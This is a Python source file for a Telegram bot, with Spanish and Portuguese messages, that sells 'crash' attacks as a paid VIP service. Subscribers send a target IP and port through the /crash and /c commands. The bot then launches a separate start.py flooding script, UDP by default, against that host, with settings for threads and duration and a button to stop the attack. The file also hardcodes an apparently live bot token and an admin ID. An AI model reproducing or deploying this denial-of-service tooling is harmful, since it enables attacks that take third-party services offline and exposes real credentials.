import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "6925806290:AAF0qiHVFCtY86WQ2XB26e5YfVQOaLwyx_w"
ADMIN_ID = 5658178016
START_PY_PATH = "start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "Su plan vip expiró."
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"CLIENTE VIP!\n"
                f"Dias restantes: {dias_restantes} dia(s)\n"
                f"Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "*No tienes un plan vip activo.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="VENDEDOR",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "*Hola, soy Ai Kurumi, un bot crash*"
            

            f"""
```
{vip_status}```\n"""
            "*Como usar:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "*Ejemplo:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            ""
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "No eres @Naketii.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "Formato inválido. Use: `/vip <ID> <DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"Usuário {telegram_id} *vip* por {days} dias.")

@bot.message_handler(commands=["c"])
def handle_c(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "no eres vip.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "tu vip expiró..")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 1:
        bot.reply_to(message, "Espera 1 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
        return

    args = message.text.split()
    if len(args) != 2 or ":" not in args[1]:
        bot.reply_to(
            message,
            (
                "*Formato inválido!*\n\n"
                "*Uso correcto:*\n"
                "`/c <IP:PORT>`\n\n"
                "*Ejemplo:*\n"
                "`/c 143.92.125.230:10013`"
            ),
            parse_mode="Markdown",
        )
        return

    ip_port = args[1]
    threads = 53  # Número predeterminado de threads
    duration = 900  # Tiempo predeterminado en ms
    command = ["python", START_PY_PATH, "UDP", ip_port, str(threads), str(duration)]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*ATAQUE INICIADO*\n\n"
            f"*IP:* {ip_port}\n"
            f"*Tiempo (ms):* {duration}\n\n"
            f"*Creador* @Naketii"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "No eres vip.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "tu vip expiró")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 1:
        bot.reply_to(message, "Espera 1 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "*Formato inválido!*\n\n"
                "*Uso correto:*\n"
                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "*Exemplo:*\n"
                "`/crash UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*ATAQUE INICIADO*\n\n"
            f"*IP/Host:Porta:* {ip_port}\n"
            f"*Tipo:* {attack_type}\n"
            f"*Threads:* {threads}\n"
            f"*Tempo (ms):* {duration}\n\n"
            f"*Creador* @Naketii"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "Tu no puedes pararlo."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "Ataque parado con éxito.")
        bot.edit_message_text(
            "*ATAQUE FINALIZADO*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "No se encontro ningun ataque, siga con su acción.")

if __name__ == "__main__":
    bot.infinity_polling()
